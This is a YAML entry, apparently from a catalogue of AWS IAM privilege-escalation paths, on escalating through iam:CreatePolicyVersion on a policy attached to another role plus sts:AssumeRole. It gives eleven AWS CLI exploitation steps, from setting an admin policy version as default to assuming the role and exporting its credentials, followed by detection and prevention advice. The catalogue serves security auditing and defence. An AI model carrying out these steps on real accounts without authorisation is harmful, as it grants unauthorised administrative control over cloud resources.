id: iam-016
name: iam:CreatePolicyVersion + sts:AssumeRole
category: principal-access
services:
- iam
- sts
permissions:
  required:
  - permission: iam:CreatePolicyVersion
    resourceConstraints: Customer-managed policy ARN must be in the Resource section
      and the policy must be attached to a role that the attacker can assume
  - permission: sts:AssumeRole
    resourceConstraints: Target role ARN must be in the Resource section and the role's
      trust policy must allow the principal to assume it
  additional:
  - permission: iam:GetPolicy
    resourceConstraints: Helpful for getting policy ARN and current version information
  - permission: iam:GetPolicyVersion
    resourceConstraints: Useful for viewing current policy document and version details
  - permission: iam:ListPolicyVersions
    resourceConstraints: Helpful for listing all policy versions to verify new version
      creation
  - permission: iam:ListRoles
    resourceConstraints: Useful for discovering roles that have the target policy
      attached
  - permission: iam:GetRole
    resourceConstraints: Helpful for viewing role details, attached policies, and
      trust policies
description: This is a variation of `iam:CreatePolicyVersion` (iam-001). This variation
  is needed when you have `iam:CreatePolicyVersion` permission on a customer-managed
  policy that is attached to another role (not your own principal). In this scenario,
  you cannot directly escalate your own privileges, but you can escalate by modifying
  a policy attached to a different role and then assuming that role. This requires
  both `iam:CreatePolicyVersion` on a customer-managed policy AND `sts:AssumeRole`
  permission on a role that has that policy attached. Critically, the target role
  must also be configured with a trust policy that explicitly allows your principal
  to assume it. You create a new policy version with administrative permissions (setting
  it as default), then assume the role that has this policy attached to gain the elevated
  privileges. This exploits AWS's policy versioning feature where new versions take
  effect immediately for all principals that have the policy attached.
prerequisites:
  admin:
  - A customer-managed policy must exist that is attached to a target role
  - You must have `iam:CreatePolicyVersion` permission on that customer-managed policy
  - You must have `sts:AssumeRole` permission scoped to the target role
  - '**Critical**: The target role must have a trust policy that explicitly allows
    your principal to assume it (e.g., your user or role ARN must be in the Principal
    element of the role''s trust policy)'
  lateral:
  - A customer-managed policy must exist that is attached to a target role
  - You must have `iam:CreatePolicyVersion` permission on that customer-managed policy
  - You must have `sts:AssumeRole` permission scoped to the target role
  - '**Critical**: The target role must have a trust policy that explicitly allows
    your principal to assume it (e.g., your user or role ARN must be in the Principal
    element of the role''s trust policy)'
exploitationSteps:
  awscli:
  - step: 1
    command: aws sts get-caller-identity
    description: Verify current identity before privilege escalation
  - step: 2
    command: aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table
    description: List available roles to find targets with the customer-managed policy
      attached (optional but helpful for discovery)
  - step: 3
    command: aws iam get-policy --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY
    description: Get the target customer-managed policy information to verify it exists
      and check current version
  - step: 4
    command: aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY
      --version-id v1
    description: View the current policy document to understand existing permissions
      (optional)
  - step: 5
    command: "aws iam create-policy-version \\\n  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY\
      \ \\\n  --policy-document file://admin_policy.json \\\n  --set-as-default\n"
    description: Create a new policy version with administrative permissions and set
      it as default. The policy immediately takes effect for all principals that have
      it attached.
  - step: 6
    command: sleep 15
    description: Wait briefly for the policy changes to propagate across AWS (typically
      takes a few seconds)
  - step: 7
    command: aws iam list-policy-versions --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY
    description: Verify the new policy version was created and is set as default (optional)
  - step: 8
    command: "aws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE\
      \ \\\n  --role-session-name privesc-session\n"
    description: Assume the target role to obtain temporary credentials with the newly
      elevated permissions
  - step: 9
    command: 'export AWS_ACCESS_KEY_ID=<AccessKeyId from step 8>

      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 8>

      export AWS_SESSION_TOKEN=<SessionToken from step 8>

      '
    description: Configure the AWS CLI to use the assumed role credentials
  - step: 10
    command: aws sts get-caller-identity
    description: Verify the assumed role identity
  - step: 11
    command: aws iam list-users --max-items 3
    description: Verify administrative access was successfully obtained
limitations: 'This path provides administrative access only if the new policy version
  includes administrative permissions (e.g., AdministratorAccess equivalent). The
  attacker gains whatever permissions are specified in the new policy version they
  create. However, even limited additional permissions may enable multi-hop attacks.

  '
recommendation: "This attack path requires multiple controls to prevent effectively:\n\
  \n**1. Restrict `iam:CreatePolicyVersion` permission:**\n- Very few principals need\
  \ this permission. Restrict it to only authorized IAM administrators.\n- Use resource-level\
  \ restrictions to limit which policies can be modified:\n```json\n{\n  \"Effect\"\
  : \"Allow\",\n  \"Action\": \"iam:CreatePolicyVersion\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:policy/AllowedPolicy*\"\
  \n}\n```\n\n**2. Restrict `sts:AssumeRole` permission:**\n- Carefully audit IAM\
  \ role trust policies to ensure they follow the principle of least privilege.\n\
  - Only allow trusted principals to assume sensitive roles.\n- Consider requiring\
  \ MFA for sensitive role assumptions:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"\
  Principal\": {\"AWS\": \"arn:aws:iam::ACCOUNT_ID:user/TrustedUser\"},\n  \"Action\"\
  : \"sts:AssumeRole\",\n  \"Condition\": {\"Bool\": {\"aws:MultiFactorAuthPresent\"\
  : \"true\"}}\n}\n```\n\n**3. Monitoring and Detection:**\n- Alert on `CreatePolicyVersion`\
  \ events in CloudTrail, especially with `--set-as-default` flag\n- Monitor for `AssumeRole`\
  \ events on privileged roles, especially shortly after policy version changes\n\
  - Use AWS Config rules to detect roles with administrative permissions that can\
  \ be assumed by users\n- Implement anomaly detection for unusual assume-role patterns\
  \ or assumptions from unexpected IP addresses\n\n**4. Additional Controls:**\n-\
  \ Use IAM Access Analyzer to regularly audit role trust policies for overly permissive\
  \ trust relationships\n- Implement service control policies (SCPs) to restrict policy\
  \ version creation at the organizational level\n- Consider using permission boundaries\
  \ to limit the maximum permissions that can be granted through policy modifications\n"
